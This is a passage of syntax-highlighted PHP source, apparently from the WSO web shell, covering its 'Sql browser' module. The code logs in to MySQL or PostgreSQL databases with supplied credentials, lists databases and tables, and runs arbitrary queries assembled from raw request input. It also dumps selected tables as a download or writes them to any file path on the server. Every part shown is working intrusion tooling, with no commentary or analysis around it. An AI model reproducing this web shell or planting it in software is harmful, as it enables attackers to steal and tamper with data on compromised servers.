        <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
        <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
        <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
            <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=dump.sql&quot;</span><span class="p">);</span>
            <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/plain&quot;</span><span class="p">);</span>
            <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
                <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
            <span class="k">exit</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
                <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$fp</span><span class="p">);</span>
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
        <span class="p">}</span> <span class="k">else</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&amp;lt;script&amp;gt;alert(&quot;Error! Can\&#39;t open file&quot;);window.history.back(-1)&amp;lt;/script&amp;gt;&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">&quot;</span>

<span class="s2">&amp;lt;h1&amp;gt;Sql browser&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;</span>
<span class="s2">&amp;lt;form name=&#39;sf&#39; method=&#39;post&#39; onsubmit=&#39;fs(this);&#39;&amp;gt;&amp;lt;table cellpadding=&#39;2&#39; cellspacing=&#39;0&#39;&amp;gt;&amp;lt;tr&amp;gt;</span>
<span class="s2">&amp;lt;td&amp;gt;Type&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Host&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Login&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Password&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Database&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=a value=Sql&amp;gt;&amp;lt;input type=hidden name=p1 value=&#39;query&#39;&amp;gt;&amp;lt;input type=hidden name=p2 value=&#39;&#39;&amp;gt;&amp;lt;input type=hidden name=c value=&#39;&quot;</span><span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=hidden name=charset value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;select name=&#39;type&#39;&amp;gt;&amp;lt;option value=&#39;mysql&#39; &quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;mysql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;gt;MySql&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;pgsql&#39; &quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;gt;PostgreSql&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_host value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;localhost&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_login value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;root&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_pass value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;input type=text name=sql_base value=&#39;&#39;&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">listDbs</span><span class="p">();</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;select name=sql_base&amp;gt;&amp;lt;option value=&#39;&#39;&amp;gt;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$value</span><span class="o">==</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;selected&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/option&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/select&amp;gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span>
        <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;</span>

<span class="s2">               &amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39; onclick=&#39;fs(d.sf);&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">                &amp;lt;td&amp;gt;&amp;lt;input type=checkbox name=sql_count value=&#39;on&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="s1">&#39; checked&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&amp;gt; count the number of rows&amp;lt;/td&amp;gt;</span>
<span class="s2">           &amp;lt;/tr&amp;gt;</span>
<span class="s2">       &amp;lt;/table&amp;gt;</span>
<span class="s2">       &amp;lt;script&amp;gt;</span>
<span class="s2">            s_db=&#39;&quot;</span><span class="o">.@</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">            function fs(f) {</span>
<span class="s2">                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};</span>
<span class="s2">                    if(f.p1) f.p1.value=&#39;&#39;;</span>
<span class="s2">                    if(f.p2) f.p2.value=&#39;&#39;;</span>
<span class="s2">                    if(f.p3) f.p3.value=&#39;&#39;;</span>
<span class="s2">                }</span>
<span class="s2">            }</span>
<span class="s2">           function st(t,l) {</span>
<span class="s2">               d.sf.p1.value = &#39;select&#39;;</span>
<span class="s2">               d.sf.p2.value = t;</span>
<span class="s2">                if(l &amp;&amp; d.sf.p3) d.sf.p3.value = l;</span>
<span class="s2">               d.sf.submit();</span>
<span class="s2">           }</span>
<span class="s2">           function is() {</span>
<span class="s2">               for(i=0;i&amp;lt;d.sf.elements[&#39;tbl[]&#39;].length;++i)</span>
<span class="s2">                   d.sf.elements[&#39;tbl[]&#39;][i].checked = !d.sf.elements[&#39;tbl[]&#39;][i].checked;</span>
<span class="s2">           }</span>
<span class="s2">       &amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br/&amp;gt;&amp;lt;table width=100% cellpadding=2 cellspacing=0&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">])){</span>
                <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td width=1 style=&#39;border-top:2px solid #666;&#39;&amp;gt;&amp;lt;span&amp;gt;Tables:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="nv">$tbls_res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">listTables</span><span class="p">();</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$tbls_res</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">]))</span>
                        <span class="nv">$n</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">));</span>
                    <span class="nv">$value</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;nobr&amp;gt;&amp;lt;input type=&#39;checkbox&#39; name=&#39;tbl[]&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;nbsp;&amp;lt;a href=# onclick=</span><span class="se">\&quot;</span><span class="s2">st(&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;,1)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&amp;nbsp;&#39;</span><span class="o">:</span><span class="s2">&quot; &amp;lt;small&amp;gt;(</span><span class="si">{</span><span class="nv">$n</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">)&amp;lt;/small&amp;gt;&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/nobr&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=&#39;checkbox&#39; onclick=&#39;is();&#39;&amp;gt; &amp;lt;input type=button value=&#39;Dump&#39; onclick=&#39;document.sf.p2.value=</span><span class="se">\&quot;</span><span class="s2">download</span><span class="se">\&quot;</span><span class="s2">;document.sf.submit();&#39;&amp;gt;&amp;lt;br&amp;gt;File path:&amp;lt;input type=text name=file value=&#39;dump.sql&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td style=&#39;border-top:2px solid #666;&#39;&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;select&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;query&#39;</span><span class="p">;</span>
                    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
                    <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
                    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">();</span>
                    <span class="nv">$pages</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">30</span><span class="p">);</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;script&amp;gt;d.sf.onsubmit=function(){st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, d.sf.p3.value)}&amp;lt;/script&amp;gt;&amp;lt;span&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt; (</span><span class="si">{</span><span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> records) Page # &amp;lt;input type=text name=&#39;p3&#39; value=&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="p">;</span>
                    <span class="k">echo</span> <span class="s2">&quot; of </span><span class="si">$pages</span><span class="s2">&quot;</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">1</span><span class="p">)</span>
                        <span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=# onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&quot;, &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;)&#39;&amp;gt;&amp;lt; Prev&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$pages</span><span class="p">)</span>
                        <span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=# onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&quot;, &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;)&#39;&amp;gt;Next &amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
                    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span>
                        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; LIMIT 30 OFFSET &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">);</span>
                    <span class="k">else</span>
                        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;` LIMIT &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;,30&#39;</span><span class="p">;</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">((</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;query&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$title</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;table width=100% cellspacing=1 cellpadding=2 class=main style=&quot;background-color:#292929&quot;&amp;gt;&#39;</span><span class="p">;</span>
                        <span class="nv">$line</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                        <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span>    <span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$title</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;&#39;</span><span class="p">;</span>
